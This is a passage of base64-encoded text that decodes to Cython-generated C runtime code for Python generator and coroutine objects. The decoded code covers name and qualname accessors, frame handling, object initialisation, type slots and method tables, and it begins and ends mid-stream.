eF9Db3JvdXRpbmVfVVNFRAojaWZkZWYgX19QeXhfR2VuZXJhdG9yX1VTRUQKICAgIGlmICghX19QeXhfR2VuZXJhdG9yX0NoZWNrRXhhY3Qoc2VsZikpCiNlbmRpZgogICAgICAgIHsKICAgICAgICBQeU9iamVjdF9HQ19VblRyYWNrKHNlbGYpOwogICAgICAgIGlmICh1bmxpa2VseShQeUVycl9XYXJuRm9ybWF0KFB5RXhjX1J1bnRpbWVXYXJuaW5nLCAxLCAiY29yb3V0aW5lICclLjUwUycgd2FzIG5ldmVyIGF3YWl0ZWQiLCBnZW4tPmdpX3F1YWxuYW1lKSA8IDApKQogICAgICAgICAgICBQeUVycl9Xcml0ZVVucmFpc2FibGUoc2VsZik7CiAgICAgICAgUHlPYmplY3RfR0NfVHJhY2soc2VsZik7CiAgICAgICAgfQojZW5kaWYKICAgIH0gZWxzZSB7CiAgICAgICAgUHlPYmplY3QgKnJldHZhbCA9IE5VTEw7CiAgICAgICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZShzZWxmLCAmcmV0dmFsKTsKICAgICAgICBpZiAocmVzdWx0ID09IFBZR0VOX0VSUk9SKSB7CiAgICAgICAgICAgIFB5RXJyX1dyaXRlVW5yYWlzYWJsZShzZWxmKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBQeV9YREVDUkVGKHJldHZhbCk7CiAgICAgICAgfQogICAgfQogICAgX19QeXhfRXJyUmVzdG9yZShlcnJvcl90eXBlLCBlcnJvcl92YWx1ZSwgZXJyb3JfdHJhY2ViYWNrKTsKfQojZW5kaWYKc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ29yb3V0aW5lX2dldF9uYW1lKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqc2VsZiwgdm9pZCAqY29udGV4dCkKewogICAgUHlPYmplY3QgKm5hbWUgPSBzZWxmLT5naV9uYW1lOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBpZiAodW5saWtlbHkoIW5hbWUpKSBuYW1lID0gUHlfTm9uZTsKICAgIFB5X0lOQ1JFRihuYW1lKTsKICAgIHJldHVybiBuYW1lOwp9CnN0YXRpYyBpbnQKX19QeXhfQ29yb3V0aW5lX3NldF9uYW1lKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlLCB2b2lkICpjb250ZXh0KQp7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIGlmICh1bmxpa2VseSh2YWx1ZSA9PSBOVUxMIHx8ICFQeVVuaWNvZGVfQ2hlY2sodmFsdWUpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICJfX25hbWVfXyBtdXN0IGJlIHNldCB0byBhIHN0cmluZyBvYmplY3QiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBQeV9JTkNSRUYodmFsdWUpOwogICAgX19QeXhfUHlfWERFQ1JFRl9TRVQoc2VsZi0+Z2lfbmFtZSwgdmFsdWUpOwogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ29yb3V0aW5lX2dldF9xdWFsbmFtZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKnNlbGYsIHZvaWQgKmNvbnRleHQpCnsKICAgIFB5T2JqZWN0ICpuYW1lID0gc2VsZi0+Z2lfcXVhbG5hbWU7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIGlmICh1bmxpa2VseSghbmFtZSkpIG5hbWUgPSBQeV9Ob25lOwogICAgUHlfSU5DUkVGKG5hbWUpOwogICAgcmV0dXJuIG5hbWU7Cn0Kc3RhdGljIGludApfX1B5eF9Db3JvdXRpbmVfc2V0X3F1YWxuYW1lKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlLCB2b2lkICpjb250ZXh0KQp7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIGlmICh1bmxpa2VseSh2YWx1ZSA9PSBOVUxMIHx8ICFQeVVuaWNvZGVfQ2hlY2sodmFsdWUpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICJfX3F1YWxuYW1lX18gbXVzdCBiZSBzZXQgdG8gYSBzdHJpbmcgb2JqZWN0Iik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgUHlfSU5DUkVGKHZhbHVlKTsKICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKHNlbGYtPmdpX3F1YWxuYW1lLCB2YWx1ZSk7CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9fQ29yb3V0aW5lX2dldF9mcmFtZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKnNlbGYpCnsKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeU9iamVjdCAqZnJhbWU7CiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAogICAgUHlfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihzZWxmKTsKICAgICNlbmRpZgogICAgZnJhbWUgPSBzZWxmLT5naV9mcmFtZTsKICAgIGlmICghZnJhbWUpIHsKICAgICAgICBpZiAodW5saWtlbHkoIXNlbGYtPmdpX2NvZGUpKSB7CiAgICAgICAgICAgIFB5X1JFVFVSTl9OT05FOwogICAgICAgIH0KICAgICAgICBQeU9iamVjdCAqZ2xvYmFscyA9IFB5RGljdF9OZXcoKTsKICAgICAgICBpZiAodW5saWtlbHkoIWdsb2JhbHMpKSByZXR1cm4gTlVMTDsKICAgICAgICBmcmFtZSA9IChQeU9iamVjdCAqKSBQeUZyYW1lX05ldygKICAgICAgICAgICAgUHlUaHJlYWRTdGF0ZV9HZXQoKSwgICAgICAgICAgICAKICAgICAgICAgICAgKFB5Q29kZU9iamVjdCopIHNlbGYtPmdpX2NvZGUsICAKICAgICAgICAgICAgZ2xvYmFscywgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICApOwogICAgICAgIFB5X0RFQ1JFRihnbG9iYWxzKTsKICAgICAgICBpZiAodW5saWtlbHkoIWZyYW1lKSkKICAgICAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAgICAgaWYgKHVubGlrZWx5KHNlbGYtPmdpX2ZyYW1lKSkgewogICAgICAgICAgICBQeV9ERUNSRUYoZnJhbWUpOwogICAgICAgICAgICBmcmFtZSA9IHNlbGYtPmdpX2ZyYW1lOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHNlbGYtPmdpX2ZyYW1lID0gZnJhbWU7CiAgICAgICAgfQogICAgfQogICAgUHlfSU5DUkVGKGZyYW1lKTsKICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwCiAgICBQeV9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgI2VuZGlmCiAgICByZXR1cm4gZnJhbWU7CiNlbHNlCiAgICBDWVRIT05fVU5VU0VEX1ZBUihzZWxmKTsKICAgIFB5X1JFVFVSTl9OT05FOwojZW5kaWYKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9Db3JvdXRpbmVfZ2V0X2ZyYW1lKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqc2VsZiwgdm9pZCAqY29udGV4dCkgewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBQeU9iamVjdCAqZnJhbWUgPSBzZWxmLT5naV9mcmFtZTsKICAgIGlmIChmcmFtZSkKICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKGZyYW1lKTsKICAgIHJldHVybiBfX1B5eF9fQ29yb3V0aW5lX2dldF9mcmFtZShzZWxmKTsKfQpzdGF0aWMgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpfX1B5eF9fQ29yb3V0aW5lX05ldygKICAgICAgICAgICAgUHlUeXBlT2JqZWN0KiB0eXBlLCBfX3B5eF9jb3JvdXRpbmVfYm9keV90IGJvZHksIFB5T2JqZWN0ICpjb2RlLCBQeU9iamVjdCAqY2xvc3VyZSwKICAgICAgICAgICAgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpxdWFsbmFtZSwgUHlPYmplY3QgKm1vZHVsZV9uYW1lKSB7CiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IFB5T2JqZWN0X0dDX05ldyhfX3B5eF9Db3JvdXRpbmVPYmplY3QsIHR5cGUpOwogICAgaWYgKHVubGlrZWx5KCFnZW4pKQogICAgICAgIHJldHVybiBOVUxMOwogICAgcmV0dXJuIF9fUHl4X19Db3JvdXRpbmVfTmV3SW5pdChnZW4sIGJvZHksIGNvZGUsIGNsb3N1cmUsIG5hbWUsIHF1YWxuYW1lLCBtb2R1bGVfbmFtZSk7Cn0Kc3RhdGljIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19QeXhfX0Nvcm91dGluZV9OZXdJbml0KAogICAgICAgICAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiwgX19weXhfY29yb3V0aW5lX2JvZHlfdCBib2R5LCBQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKmNsb3N1cmUsCiAgICAgICAgICAgIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcXVhbG5hbWUsIFB5T2JqZWN0ICptb2R1bGVfbmFtZSkgewogICAgZ2VuLT5ib2R5ID0gYm9keTsKICAgIGdlbi0+Y2xvc3VyZSA9IGNsb3N1cmU7CiAgICBQeV9YSU5DUkVGKGNsb3N1cmUpOwogICAgZ2VuLT5pc19ydW5uaW5nID0gMDsKICAgIGdlbi0+cmVzdW1lX2xhYmVsID0gMDsKICAgIGdlbi0+Y2xhc3NvYmogPSBOVUxMOwogICAgZ2VuLT55aWVsZGZyb20gPSBOVUxMOwogICAgZ2VuLT55aWVsZGZyb21fYW1fc2VuZCA9IE5VTEw7CiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgZ2VuLT5naV9leGNfc3RhdGUuZXhjX3ZhbHVlID0gTlVMTDsKICAgICNlbHNlCiAgICBnZW4tPmdpX2V4Y19zdGF0ZS5leGNfdHlwZSA9IE5VTEw7CiAgICBnZW4tPmdpX2V4Y19zdGF0ZS5leGNfdmFsdWUgPSBOVUxMOwogICAgZ2VuLT5naV9leGNfc3RhdGUuZXhjX3RyYWNlYmFjayA9IE5VTEw7CiAgICAjZW5kaWYKI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sKICAgIGdlbi0+Z2lfZXhjX3N0YXRlLnByZXZpb3VzX2l0ZW0gPSBOVUxMOwojZW5kaWYKICAgIGdlbi0+Z2lfd2Vha3JlZmxpc3QgPSBOVUxMOwogICAgUHlfWElOQ1JFRihxdWFsbmFtZSk7CiAgICBnZW4tPmdpX3F1YWxuYW1lID0gcXVhbG5hbWU7CiAgICBQeV9YSU5DUkVGKG5hbWUpOwogICAgZ2VuLT5naV9uYW1lID0gbmFtZTsKICAgIFB5X1hJTkNSRUYobW9kdWxlX25hbWUpOwogICAgZ2VuLT5naV9tb2R1bGVuYW1lID0gbW9kdWxlX25hbWU7CiAgICBQeV9YSU5DUkVGKGNvZGUpOwogICAgZ2VuLT5naV9jb2RlID0gY29kZTsKICAgIGdlbi0+Z2lfZnJhbWUgPSBOVUxMOwogICAgUHlPYmplY3RfR0NfVHJhY2soZ2VuKTsKICAgIHJldHVybiBnZW47Cn0Kc3RhdGljIGNoYXIgX19QeXhfQ29yb3V0aW5lX3Rlc3RfYW5kX3NldF9pc19ydW5uaW5nKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuKSB7CiAgICBjaGFyIHJlc3VsdDsKICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeV9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKGdlbik7CiAgICAjZW5kaWYKICAgIHJlc3VsdCA9IGdlbi0+aXNfcnVubmluZzsKICAgIGdlbi0+aXNfcnVubmluZyA9IDE7CiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgICNlbmRpZgogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgdm9pZCBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbikgewogICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04oZ2VuKTsKICAgICNlbmRpZgogICAgYXNzZXJ0KGdlbi0+aXNfcnVubmluZyk7CiAgICBnZW4tPmlzX3J1bm5pbmcgPSAwOwogICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICAjZW5kaWYKfQpzdGF0aWMgY2hhciBfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pIHsKICAgIGNoYXIgcmVzdWx0OwogICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04oZ2VuKTsKICAgICNlbmRpZgogICAgcmVzdWx0ID0gZ2VuLT5pc19ydW5uaW5nOwogICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICAjZW5kaWYKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmdfZ2V0dGVyKFB5T2JqZWN0ICpnZW4sIHZvaWQgKmNsb3N1cmUpIHsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNsb3N1cmUpOwogICAgY2hhciByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoKF9fcHl4X0Nvcm91dGluZU9iamVjdCopZ2VuKTsKICAgIGlmIChyZXN1bHQpIFB5X1JFVFVSTl9UUlVFOwogICAgZWxzZSBQeV9SRVRVUk5fRkFMU0U7Cn0KI2lmIF9fUFlYX0hBU19QWV9BTV9TRU5EID09IDIKc3RhdGljIHZvaWQgX19QeXhfU2V0QmFja3BvcnRUeXBlQW1TZW5kKFB5VHlwZU9iamVjdCAqdHlwZSwgX19QeXhfUHlBc3luY01ldGhvZHNTdHJ1Y3QgKnN0YXRpY19hbXNlbmRfbWV0aG9kcywgX19QeXhfcHlpdGVyX3NlbmRmdW5jIGFtX3NlbmQpIHsKICAgIFB5X3NzaXplX3QgcHRyX29mZnNldCA9IChjaGFyKikodHlwZS0+dHBfYXNfYXN5bmMpIC0gKGNoYXIqKXR5cGU7CiAgICBpZiAocHRyX29mZnNldCA8IDAgfHwgcHRyX29mZnNldCA+IHR5cGUtPnRwX2Jhc2ljc2l6ZSkgewogICAgICAgIHJldHVybjsKICAgIH0KICAgIG1lbWNweSgodm9pZCopc3RhdGljX2Ftc2VuZF9tZXRob2RzLCAodm9pZCopKHR5cGUtPnRwX2FzX2FzeW5jKSwgc2l6ZW9mKCp0eXBlLT50cF9hc19hc3luYykpOwogICAgc3RhdGljX2Ftc2VuZF9tZXRob2RzLT5hbV9zZW5kID0gYW1fc2VuZDsKICAgIHR5cGUtPnRwX2FzX2FzeW5jID0gX19QeXhfU2xvdFRwQXNBc3luYyhzdGF0aWNfYW1zZW5kX21ldGhvZHMpOwp9CiNlbmRpZgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0Nvcm91dGluZV9mYWlsX3JlZHVjZV9leChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKmFyZykgewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoYXJnKTsKICAgIF9fUHl4X1R5cGVOYW1lIHNlbGZfdHlwZV9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShQeV9UWVBFKChQeU9iamVjdCopc2VsZikpOwogICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvciwgImNhbm5vdCBwaWNrbGUgJyIgX19QeXhfRk1UX1RZUEVOQU1FICInIG9iamVjdCIsCiAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmX3R5cGVfbmFtZSk7CiAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUoc2VsZl90eXBlX25hbWUpOwogICAgcmV0dXJuIE5VTEw7Cn0KCgpzdGF0aWMgUHlNZXRob2REZWYgX19weXhfR2VuZXJhdG9yX21ldGhvZHNbXSA9IHsKICAgIHsic2VuZCIsIChQeUNGdW5jdGlvbikgX19QeXhfQ29yb3V0aW5lX1NlbmQsIE1FVEhfTywKICAgICBQeURvY19TVFIoInNlbmQoYXJnKSAtPiBzZW5kICdhcmcnIGludG8gZ2VuZXJhdG9yLFxucmV0dXJuIG5leHQgeWllbGRlZCB2YWx1ZSBvciByYWlzZSBTdG9wSXRlcmF0aW9uLiIpfSwKICAgIHsidGhyb3ciLCAoUHlDRnVuY3Rpb24pIF9fUHl4X0Nvcm91dGluZV9UaHJvdywgTUVUSF9WQVJBUkdTLAogICAgIFB5RG9jX1NUUigidGhyb3codHlwWyx2YWxbLHRiXV0pIC0+IHJhaXNlIGV4Y2VwdGlvbiBpbiBnZW5lcmF0b3IsXG5yZXR1cm4gbmV4dCB5aWVsZGVkIHZhbHVlIG9yIHJhaXNlIFN0b3BJdGVyYXRpb24uIil9LAogICAgeyJjbG9zZSIsIChQeUNGdW5jdGlvbikgX19QeXhfQ29yb3V0aW5lX0Nsb3NlX01ldGhvZCwgTUVUSF9OT0FSR1MsCiAgICAgUHlEb2NfU1RSKCJjbG9zZSgpIC0+IHJhaXNlIEdlbmVyYXRvckV4aXQgaW5zaWRlIGdlbmVyYXRvci4iKX0sCiAgICB7Il9fcmVkdWNlX2V4X18iLCAoUHlDRnVuY3Rpb24pIF9fUHl4X0Nvcm91dGluZV9mYWlsX3JlZHVjZV9leCwgTUVUSF9PLCAwfSwKICAgIHsiX19yZWR1Y2VfXyIsIChQeUNGdW5jdGlvbikgX19QeXhfQ29yb3V0aW5lX2ZhaWxfcmVkdWNlX2V4LCBNRVRIX05PQVJHUywgMH0sCiAgICB7MCwgMCwgMCwgMH0KfTsKc3RhdGljIFB5TWVtYmVyRGVmIF9fcHl4X0dlbmVyYXRvcl9tZW1iZXJsaXN0W10gPSB7CiAgICB7ImdpX3lpZWxkZnJvbSIsIFRfT0JKRUNULCBvZmZzZXRvZihfX3B5eF9Db3JvdXRpbmVPYmplY3QsIHlpZWxkZnJvbSksIFJFQURPTkxZLAogICAgIFB5RG9jX1NUUigib2JqZWN0IGJlaW5nIGl0ZXJhdGVkIGJ5ICd5aWVsZCBmcm9tJywgb3IgTm9uZSIpfSwKICAgIHsiZ2lfY29kZSIsIFRfT0JKRUNULCBvZmZzZXRvZihfX3B5eF9Db3JvdXRpbmVPYmplY3QsIGdpX2NvZGUpLCBSRUFET05MWSwgTlVMTH0sCiAgICB7Il9fbW9kdWxlX18iLCBUX09CSkVDVCwgb2Zmc2V0b2YoX19weXhfQ29yb3V0aW5lT2JqZWN0LCBnaV9tb2R1bGVuYW1lKSwgMCwgMH0sCiAgICB7Il9fd2Vha2xpc3RvZmZzZXRfXyIsIFRfUFlTU0laRVQsIG9mZnNldG9mKF9fcHl4X0Nvcm91dGluZU9iamVjdCwgZ2lfd2Vha3JlZmxpc3QpLCBSRUFET05MWSwgMH0sCiAgICB7MCwgMCwgMCwgMCwgMH0KfTsKc3RhdGljIFB5R2V0U2V0RGVmIF9fcHl4X0dlbmVyYXRvcl9nZXRzZXRzW10gPSB7CiAgICB7Il9fbmFtZV9fIiwgKGdldHRlcilfX1B5eF9Db3JvdXRpbmVfZ2V0X25hbWUsIChzZXR0ZXIpX19QeXhfQ29yb3V0aW5lX3NldF9uYW1lLAogICAgIFB5RG9jX1NUUigibmFtZSBvZiB0aGUgZ2VuZXJhdG9yIiksIDB9LAogICAgeyJfX3F1YWxuYW1lX18iLCAoZ2V0dGVyKV9fUHl4X0Nvcm91dGluZV9nZXRfcXVhbG5hbWUsIChzZXR0ZXIpX19QeXhfQ29yb3V0aW5lX3NldF9xdWFsbmFtZSwKICAgICBQeURvY19TVFIoInF1YWxpZmllZCBuYW1lIG9mIHRoZSBnZW5lcmF0b3IiKSwgMH0sCiAgICB7ImdpX2ZyYW1lIiwgKGdldHRlcilfX1B5eF9Db3JvdXRpbmVfZ2V0X2ZyYW1lLCBOVUxMLAogICAgIFB5RG9jX1NUUigiRnJhbWUgb2YgdGhlIGdlbmVyYXRvciIpLCAwfSwKICAgIHsiZ2lfcnVubmluZyIsIF9fUHl4X0Nvcm91dGluZV9nZXRfaXNfcnVubmluZ19nZXR0ZXIsIE5VTEwsIE5VTEwsIE5VTEx9LAogICAgezAsIDAsIDAsIDAsIDB9Cn07CnN0YXRpYyBQeVR5cGVfU2xvdCBfX3B5eF9HZW5lcmF0b3JUeXBlX3Nsb3RzW10gPSB7CiAgICB7UHlfdHBfZGVhbGxvYywgKHZvaWQgKilfX1B5eF9Db3JvdXRpbmVfZGVhbGxvY30sCiAgICB7UHlfdHBfdHJhdmVyc2UsICh2b2lkICopX19QeXhfQ29yb3V0aW5lX3RyYXZlcnNlfSwKICAgIHtQeV90cF9pdGVyLCAodm9pZCAqKVB5T2JqZWN0X1NlbGZJdGVyfSwKICAgIHtQeV90cF9pdGVybmV4dCwgKHZvaWQgKilfX1B5eF9HZW5lcmF0b3JfTmV4dH0sCiAgICB7UHlfdHBfbWV0aG9kcywgKHZvaWQgKilfX3B5eF9HZW5lcmF0b3JfbWV0aG9kc30sCiAgICB7UHlfdHBfbWVtYmVycywgKHZvaWQgKilfX3B5eF9HZW5lcmF0b3JfbWVtYmVybGlzdH0sCiAgICB7UHlfdHBfZ2V0c2V0LCAodm9pZCAqKV9fcHl4X0dlbmVyYXRvcl9nZXRzZXRzfSwKICAgIHtQeV90cF9nZXRhdHRybywgKHZvaWQgKikgUHlPYmplY3RfR2VuZXJpY0dldEF0dHJ9LAojaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogICAge1B5X3RwX2ZpbmFsaXplLCAodm9pZCAqKV9fUHl4X0Nvcm91dGluZV9kZWx9LAojZW5kaWYKI2lmIF9fUFlYX0hBU19QWV9BTV9TRU5EID09IDEKICAgIHtQeV9hbV9zZW5kLCAodm9pZCAqKV9fUHl4X0Nvcm91dGluZV9BbVNlbmR9LAojZW5kaWYKICAgIHswLCAwfSwKfTsKc3RhdGljIFB5VHlwZV9TcGVjIF9fcHl4X0dlbmVyYXRvclR5cGVfc3BlYyA9IHsKICAgIF9fUFlYX1RZUEVfTU9EVUxFX1BSRUZJWCAiZ2VuZXJhdG9yIiwKICAgIHNpemVvZihfX3B5eF9Db3JvdXRpbmVPYmplY3QpLAogICAgMCwKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDAKICAgIFB5X1RQRkxBR1NfSU1NVVRBQkxFVFlQRSB8CiNlbmRpZgogICAgUHlfVFBGTEFHU19ERUZBVUxUIHwgUHlfVFBGTEFHU19IQVZFX0dDIHwgUHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFIHwgX19QeXhfVFBGTEFHU19IQVZFX0FNX1NFTkQsCiAgICBfX3B5eF9HZW5lcmF0b3JUeXBlX3Nsb3RzCn07CiNpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA9PSAyCnN0YXRpYyBfX1B5eF9QeUFzeW5jTWV0aG9kc1N0cnVjdCBfX3B5eF9HZW5lcmF0b3JfYXNfYXN5bmM7CiNlbmRpZgpzdGF0aWMgaW50IF9fcHl4X0dlbmVyYXRvcl9pbml0KFB5T2JqZWN0ICptb2R1bGUpIHsKICAgIF9fcHl4X21zdGF0ZXR5cGUgKm1zdGF0ZSA9IF9fUHl4X1B5TW9kdWxlX0dldFN0YXRlKG1vZHVsZSk7CiAgICBtc3RhdGUtPl9fcHl4X0dlbmVyYXRvclR5cGUgPSBfX1B5eF9GZXRjaENvbW1vblR5cGVGcm9tU3BlYygKICAgICAgICBtc3RhdGUtPl9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzVHlwZSwgbW9kdWxlLCAmX19weXhfR2VuZXJhdG9yVHlwZV9zcGVjLCBOVUxMKTsKICAgIGlmICh1bmxpa2VseSghbXN0YXRlLT5fX3B5eF9HZW5lcmF0b3JUeXBlKSkgewogICAgICAgIHJldHVybiAtMTsKICAgIH0KI2lmIF9fUFlYX0hBU19QWV9BTV9TRU5EID09IDIKICAgIF9fUHl4X1NldEJhY2twb3J0VHlwZUFtU2VuZChtc3RhdGUtPl9fcHl4X0dlbmVyYXRvclR5cGUsICZfX3B5eF9HZW5lcmF0b3JfYXNfYXN5bmMsICZfX1B5eF9Db3JvdXRpbmVfQW1TZW5kKTsKI2VuZGlmCiAgICByZXR1cm4gMDsKfQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dlbmVyYXRvcl9HZXRJbmxpbmVkUmVzdWx0KFB5T2JqZWN0ICpzZWxmKSB7CiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QqKSBzZWxmOwogICAgUHlPYmplY3QgKnJldHZhbCA9IE5VTEw7CiAgICBpZiAodW5saWtlbHkoX19QeXhfQ29yb3V0aW5lX3Rlc3RfYW5kX3NldF9pc19ydW5uaW5nKGdlbikpKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X0Nvcm91dGluZV9BbHJlYWR5UnVubmluZ0Vycm9yKGdlbik7CiAgICB9CiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRFeChnZW4sIFB5X05vbmUsICZyZXR2YWwsIDApOwogICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTsKICAgICh2b2lkKSByZXN1bHQ7CiAgICBhc3NlcnQgKHJlc3VsdCA9PSBQWUdFTl9SRVRVUk4gfHwgcmVzdWx0ID09IFBZR0VOX0VSUk9SKTsKICAgIGFzc2VydCAoKHJlc3VsdCA9PSBQWUdFTl9SRVRVUk4gJiYgcmV0dmFsICE9IE5VTEwpIHx8IChyZXN1bHQgPT0gUFlHRU5fRVJST1IgJiYgcmV0dmFsID09IE5VTEwpKTsKICAgIHJldHVybiByZXR2YWw7Cn0KCgpzdGF0aWMgdW5zaWduZWQgbG9uZyBfX1B5eF9nZXRfcnVudGltZV92ZXJzaW9uKHZvaWQpIHsKI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBiMDAwMAogICAgcmV0dXJuIFB5X1ZlcnNpb24gJiB+MHhGRlVMOwojZWxzZQogICAgc3RhdGljIHVuc2lnbmVkIGxvbmcgX19QeXhfY2FjaGVkX3J1bnRpbWVfdmVyc2lvbiA9IDA7CiAgICBpZiAoX19QeXhfY2FjaGVkX3J1bnRpbWVfdmVyc2lvbiA9PSAwKSB7CiAgICAgICAgY29uc3QgY2hhciogcnRfdmVyc2lvbiA9IFB5X0dldFZlcnNpb24oKTsKICAgICAgICB1bnNpZ25lZCBsb25nIHZlcnNpb24gPSAwOwogICAgICAgIHVuc2lnbmVkIGxvbmcgZmFjdG9yID0gMHgwMTAwMDAwMFVMOwogICAgICAgIHVuc2lnbmVkIGludCBkaWdpdCA9IDA7CiAgICAgICAgaW50IGkgPSAwOwogICAgICAgIHdoaWxlIChmYWN0b3IpIHsKICAgICAgICAgICAgd2hpbGUgKCcwJyA8PSBydF92ZXJzaW9uW2ldICYmIHJ0X3ZlcnNpb25baV0gPD0gJzknKSB7CiAgICAgICAgICAgICAgICBkaWdpdCA9IGRpZ2l0ICogMTAgKyAodW5zaWduZWQgaW50KSAocnRfdmVyc2lvbltpXSAtICcwJyk7CiAgICAgICAgICAgICAgICArK2k7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgdmVyc2lvbiArPSBmYWN0b3IgKiBkaWdpdDsKICAgICAgICAgICAgaWYgKHJ0X3ZlcnNpb25baV0gIT0gJy4nKQogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAg